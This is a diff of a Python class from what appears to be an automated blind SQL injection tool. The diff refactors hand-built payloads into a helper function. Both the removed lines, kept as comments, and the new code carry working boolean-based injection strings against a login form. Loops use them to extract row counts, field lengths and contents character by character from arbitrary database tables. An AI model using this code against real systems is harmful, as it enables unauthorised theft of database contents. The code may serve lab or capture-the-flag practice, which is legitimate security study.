@@ -143,8 +143,13 @@ class SqliContent(SqliColumns):
                 # 然后注content 的 length
                 for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                     logger.debug("Start %dth content length sqli..." % (limits + 1))
-                    payload = "user=user1' %26%26 (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                        limits) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
+                    # payload = "user=user1' %26%26 (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
+                    #     limits) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(" + column_name + ")",
+                        source=database_name + "." + table_name,
+                        limit=limits,
+                        compare=j)
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         content_len = j
                         break
@@ -162,9 +167,13 @@ class SqliContent(SqliColumns):
                 for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                     for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                     leave=False, disable=True):
-                        payload = "user=user1' %26%26 (select ((SELECT ascii(substring(" + column_name + "," + repr(
-                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
-                            limits) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
+                        # payload = "user=user1' %26%26 (select ((SELECT ascii(substring(" + column_name + "," + repr(
+                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
+                        #     limits) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
+                        payload = self.dealpayload.construct_build_payload(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                                                                           source=database_name + "." + table_name,
+                                                                           limit=limits,
+                                                                           compare=(k + 30))
                         if self.Data.GetBuildData(payload, self.len) == 0:
                             content += chr(int(k + 30))
                             break
@@ -262,9 +271,14 @@ class SqliContent(SqliColumns):
                 # 然后注content 的length
                 for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                     logger.debug("Start %dth content length sqli..." % (limits + 1))
-                    payload = {
-                        "user": "user1' && (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                            limits) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
+                    # payload = {
+                    #     "user": "user1' && (select ((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
+                    #         limits) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_build_payload(
+                        select="length(" + column_name + ")",
+                        source=database_name + "." + table_name,
+                        limit=limits,
+                        compare=j)
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         content_len = j
                         break
@@ -283,9 +297,14 @@ class SqliContent(SqliColumns):
                 for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                     for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                     leave=False, disable=True):
-                        payload = {"user": "user1' && (select ((SELECT ascii(substring(" + column_name + "," + repr(
-                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
-                            limits) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
+                        # payload = {"user": "user1' && (select ((SELECT ascii(substring(" + column_name + "," + repr(
+                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
+                        #     limits) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
+                        payload = self.dealpayload.construct_build_payload(
+                            select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                            source=database_name + "." + table_name,
+                            limit=limits,
+                            compare=(k + 30))
                         if self.Data.PostBuildData(payload, self.len) == 0:
                             content += chr(int(k + 30))
                             break
@@ -378,7 +397,11 @@ class SqliContent(SqliColumns):
 
                 for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                     # 先注content的数量
-                    payload = "user=user1' %26%26 (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))%23&passwd=ddog123&submit=Log+In"
+                    # payload = "user=user1' %26%26 (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))%23&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_build_payload(
+                        select="count(*)",
+                        source=database_name + "." + table_name,
+                        compare=i)
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         content_count = i
                         break
@@ -444,8 +467,12 @@ class SqliContent(SqliColumns):
 
                 for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                     # 先注content的数量
-                    payload = {
-                        "user": "user1' && (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))#", "passwd": "ddog123"}
+                    # payload = {
+                    #     "user": "user1' && (select ((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + "))#", "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_build_payload(
+                        select="count(*)",
+                        source=database_name + "." + table_name,
+                        compare=i)
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         content_count = i
                         break
